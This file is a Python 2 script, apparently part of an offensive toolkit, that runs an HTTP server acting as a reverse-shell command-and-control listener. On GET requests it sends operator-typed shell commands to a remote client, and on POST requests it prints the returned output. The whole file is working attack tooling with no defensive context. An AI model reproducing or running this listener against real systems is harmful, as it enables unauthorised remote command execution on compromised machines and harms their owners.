#!/usr/bin/python

from lib.banner import *
from lib.functions import *
import argparse
import BaseHTTPServer

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="The IP address to listen on.")
parser.add_argument("port", help="The TCP port to listen on.")
parser.add_argument("-v", "--verbose", help="Increase verbosity of output.", action="store_true")
args = parser.parse_args()


#
#
#
class CmdHandler(BaseHTTPServer.BaseHTTPRequestHandler):

	def do_GET(s):

		cmd = raw_input(prompt("Shell"))
		s.send_response(200)
		s.send_header("Content-type", "text/html")
		s.end_headers()
		s.wfile.write(cmd)

	def do_POST(s):

		s.send_response(200)
		s.end_headers()
		length = int(s.headers['Content-Length'])
		postVar = s.rfile.read(length)
		print postVar


#
#
#
if __name__ == '__main__':
	if args.verbose:
		print(httpsrvbanner)

	server_class = BaseHTTPServer.HTTPServer
	httpd = server_class((args.ip, int(args.port)), CmdHandler)
	try:
		if args.verbose:
			print_info("Listening for connection on: " + args.ip + ":" + args.port + "\n")

		httpd.serve_forever()

	except KeyboardInterrupt:
		print_error("Server is terminated\n")
		httpd.server_close()
